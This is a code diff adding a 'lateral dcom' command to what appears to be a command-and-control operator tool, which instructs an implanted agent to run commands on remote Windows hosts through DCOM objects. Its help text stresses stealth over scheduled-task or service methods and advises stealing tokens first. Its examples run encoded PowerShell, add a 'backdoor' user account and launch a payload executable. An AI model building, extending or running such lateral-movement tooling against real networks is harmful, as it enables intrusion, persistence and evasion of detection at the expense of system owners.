@@ -175,6 +175,80 @@ Examples:
 	},
 }
 
+// ── lateral dcom ──────────────────────────────────────────────────────────────
+
+var lateralDCOMCmd = &cobra.Command{
+	Use:   "dcom <agent-id> <rhost> <command>",
+	Short: "Execute command on remote host via DCOM (no service/schtask artifact)",
+	Long: `Activates a COM object on the remote host over DCOM/RPC and calls a method
+that spawns a process. Three COM classes are supported:
+
+  mmc20       (default) MMC20.Application.ExecuteShellCommand
+              CLSID: {49B2791A-B1AE-4C90-9B8E-E860BA07F889}
+              Works on all Windows versions. No prior explorer session needed.
+
+  shellwindows  ShellWindows — requires an interactive desktop session on target.
+              CLSID: {9BA05972-F6A8-11CF-A442-00A0C90A8F39}
+
+  shellbrowser  ShellBrowserWindow — similar to shellwindows, often works when
+              shellwindows fails.
+              CLSID: {C08AFD90-F2A1-11D1-8455-00A0C91F3880}
+
+All methods are fire-and-forget (output not captured). No service, scheduled task,
+or named pipe is created — much stealthier than schtask/service.
+
+The agent must already hold a token with admin rights on the target host.
+Use 'token steal' or 'token make' first if needed.
+
+Examples:
+  lateral dcom 7d019eb7 DC01      "powershell -enc <B64>"
+  lateral dcom 7d019eb7 10.0.0.5  "cmd /c net user backdoor P@ss /add" --method mmc20 --wait
+  lateral dcom 7d019eb7 FS01      "C:\Windows\Temp\payload.exe" --method shellwindows --wait`,
+	Args: cobra.ExactArgs(3),
+	Run: func(cmd *cobra.Command, args []string) {
+		agentID, err := resolveAgentID(args[0])
+		if err != nil {
+			printError(err.Error())
+			os.Exit(1)
+		}
+		method, _ := cmd.Flags().GetString("method")
+		wait, _ := cmd.Flags().GetBool("wait")
+		timeout, _ := cmd.Flags().GetInt("timeout")
+
+		raw, _ := json.Marshal(map[string]interface{}{
+			"target":      args[1],
+			"command":     args[2],
+			"dcom_method": method,
+		})
+		body, err := makeAPIRequestWithMethod("POST",
+			"/api/v1/agent/"+agentID+"/lateral/dcom",
+			bytes.NewBuffer(raw), "application/json")
+		if err != nil {
+			printError(fmt.Sprintf("lateral dcom failed: %v", err))
+			os.Exit(1)
+		}
+		var resp APIResponse
+		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
+			msg := resp.Error
+			if msg == "" {
+				msg = "unknown error"
+			}
+			printError("lateral dcom failed: " + msg)
+			os.Exit(1)
+		}
+		dataMap, _ := resp.Data.(map[string]interface{})
+		cmdID, _ := dataMap["command_id"].(string)
+		meth, _ := dataMap["dcom_method"].(string)
+		printSuccess(fmt.Sprintf("DCOM/%s → %s  (cmd %s)", meth, args[1], cmdID))
+		if wait && cmdID != "" {
+			printInfo(fmt.Sprintf("Waiting for result (timeout %ds)...", timeout))
+			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
+				displayFinalCommandStatus(finalData, cmdID)
+			}
+		}
+	},
+}
+
 // initLateralFlags registers flags for all lateral subcommands.
 func initLateralFlags() {
 	for _, c := range []*cobra.Command{
@@ -186,4 +260,9 @@ func initLateralFlags() {
 		c.Flags().Bool("wait", false, "Wait for result")
 		c.Flags().Int("timeout", 120, "Wait timeout (seconds)")
 	}
+
+	// dcom
+	lateralDCOMCmd.Flags().String("method", "mmc20", "DCOM class: mmc20 | shellwindows | shellbrowser")
+	lateralDCOMCmd.Flags().Bool("wait", false, "Wait for result")
+	lateralDCOMCmd.Flags().Int("timeout", 60, "Wait timeout (seconds)")
 }
